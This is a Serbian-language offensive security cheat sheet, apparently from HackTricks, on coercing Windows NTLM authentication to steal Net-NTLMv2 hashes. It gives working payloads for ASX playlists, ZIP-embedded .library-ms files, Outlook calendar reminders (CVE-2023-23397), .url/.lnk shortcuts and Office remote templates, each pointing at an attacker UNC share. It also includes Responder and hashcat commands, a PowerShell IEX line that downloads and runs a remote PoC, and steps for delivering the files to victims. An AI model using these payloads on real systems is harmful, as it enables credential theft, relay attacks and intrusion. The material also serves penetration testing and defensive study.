# Mesta za krađu NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje sa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word fajla online do ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Ako možete navesti metu da otvori ili pregleda Windows Media Player playlistu pod vašom kontrolom, možete leak Net‑NTLMv2 tako što ćete podesiti unos da pokazuje na UNC path. WMP će pokušati da preuzme navedeni media preko SMB i implicitno će se autentifikovati.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackinga:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms ugrađen u ZIP — NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno tretira .library-ms fajlove kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke pokazuje na udaljeni UNC path (npr. \\attacker\share), samo pregledavanje/pokretanje .library-ms unutar ZIP-a natera Explorer da izlista taj UNC i pošalje NTLM autentifikaciju napadaču. Ovo daje NetNTLMv2 koji se može razbiti offline ili potencijalno relajovati.

Minimalni .library-ms koji pokazuje na napadačev UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms fajl sa XML-om iznad (set your IP/hostname).
- Zipujte ga (on Windows: Send to → Compressed (zipped) folder) i dostavite ZIP ciljnom računaru.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Outlook putanja zvuka podsetnika u kalendaru (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows je obrađivao prošireno MAPI svojstvo PidLidReminderFileParameter u stavkama kalendara. Ako to svojstvo pokazuje na UNC putanju (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada se podsetnik aktivira, leaking korisnikov Net‑NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje veoma relevantno za legacy/untouched fleets i za istorijski odgovor na incidente.

Brza eksploatacija pomoću PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Sa strane listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Napomene
- Žrtva treba samo da ima Outlook for Windows pokrenut kada se podsetnik aktivira.
- The leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (nije pass‑the‑hash).


### .LNK/.URL zasnovan na ikonama zero‑click NTLM leak (CVE‑2025‑50154 – zaobilaženje CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavno istraživanje je pokazalo da čak i nakon Microsoft-ovog apdejta iz aprila 2025. za UNC‑icon shortcuts, i dalje je bilo moguće pokrenuti NTLM autentikaciju bez klika tako što se cilj prečice hostuje na UNC putanji, dok je ikona lokalna (patch bypass dodeljen CVE‑2025‑50154). Samo pregledanje fascikle natera Explorer da preuzme metapodatke sa udaljenog cilja, emitujući NTLM ka SMB serveru napadača.

Minimalni Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Prečica programa payload (.lnk) putem PowerShell-a:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideje za isporuku
- Ubacite shortcut u ZIP i navedite žrtvu da ga pregleda.
- Postavite shortcut na writable share koji će žrtva otvoriti.
- Kombinujte sa drugim lure fajlovima u istom folderu tako da Explorer pregleda stavke.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office dokumenti mogu da referenciraju eksterni šablon. Ako podesite priloženi šablon na UNC path, otvaranje dokumenta će se autentifikovati na SMB.

Minimalne izmene DOCX relationship-a (unutar word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i usmerite rId1337 na vaš UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Prepakuj u .docx i dostavi. Pokreni svoj SMB capture listener i sačekaj otvaranje.

Za ideje nakon capture-a o relaying-u ili zloupotrebi NTLM, pogledaj:

{{#ref}}
README.md
{{#endref}}


## Reference
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
